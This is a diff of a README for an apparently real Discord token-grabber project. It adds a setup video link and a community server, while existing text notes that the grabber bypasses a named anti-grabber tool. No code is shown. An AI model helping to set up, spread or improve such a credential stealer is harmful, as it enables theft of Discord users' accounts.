@@ -26,6 +26,11 @@
  This project was started because I wanted to learn about Discord's infrastructure and possible exploits, mean-while I made the base of this token-grabber (like a year ago) but, not long ago I continued this project and this is the final result, of course, I will update it and add more features in the future but mean-while remember to use your power for the good 😲.
  if you liked it consider to ⭐ this project and 🕵️ (follow) me 🤔.
  
+### ⚡ Additional Information
+[How to setup the grabber](https://youtu.be/LYHPZXgqSPQ)<br>
+[Our Discord Server](https://discord.gg/XMSbWFAXn3)<br><br>
+You have any suggestion? write us in our Discord server ⤴️
+ 
 ### ⛔ What can I do against token grabbers?
 To be protected against token grabbers, you are more than welcome to install my Anti-Token-Grabber which is located on my GitHub. [I will upload it later meanwhile try https://github.com/andro2157/DiscordTokenProtector although this grabber bypassing it, other grabbers are not]
  
